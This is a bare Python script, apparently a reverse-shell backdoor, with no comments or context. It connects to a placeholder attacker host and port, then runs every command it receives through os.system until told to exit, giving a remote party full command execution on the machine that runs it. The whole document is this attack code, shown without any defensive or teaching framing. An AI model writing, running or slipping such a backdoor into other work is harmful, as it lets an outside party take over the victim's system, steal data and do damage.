import os
import sys
import socket

def get_commands():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(('ATTACKER_IP', 'ATTACKER_PORT'))
        while True:
            command = s.recv(1024)
            if command.decode('utf-8') == 'exit':
                s.close()
                sys.exit()
            else:
                print('Received command: %s' % command.decode('utf-8'))
                os.system(command.decode('utf-8'))
    except Exception as e:
        print('Caught exception: %s' %str(e))
        sys.exit()

get_commands()